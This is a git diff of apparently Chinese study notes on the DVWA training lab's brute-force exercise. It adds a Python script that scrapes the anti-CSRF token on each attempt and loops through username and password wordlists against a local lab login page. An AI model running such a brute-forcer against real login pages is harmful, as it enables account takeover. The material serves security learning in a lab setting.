@@ -100,3 +100,44 @@ mysqli_real_escape_string [菜鸟](https://www.runoob.com/php/func-mysqli-real-e
 <input type='hidden' name='user_token' value='42f15b92219b40fc0aa2f1f8215fdf56' />
 ```
 
+```python
+# 脚本爆破
+from bs4 import BeautifulSoup
+import requests
+
+
+header = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Cookie": "PHPSESSID=5skbhhtisu1kf4vfe8jvh4a2l5; security=high"
+}
+
+
+url = "http://192.168.0.111:8000/vulnerabilities/brute/"
+
+
+def get_token(url, headers):
+    response = requests.get(url, headers=headers)
+    html = response.content.decode("utf-8")
+    soup = BeautifulSoup(html, "html.parser")
+    user_token = soup.find("input", {"name": "user_token"})["value"]
+    return user_token
+
+
+
+i = 0
+for admin in open("admin.txt", "r"):
+    for password in open("password.txt", "r"):
+        user_token = get_token(url, header)
+        #  payload
+        data = {
+            "username": admin.strip(),
+            "password": password.strip(),
+            "Login": "Login",
+            "user_token": user_token
+        }
+        i = i + 1
+        response = requests.get(url, params=data, headers=header)
+        print(f"[{i}] {admin.strip()}:{password.strip()},{len(response.content)}")
+
+```
+
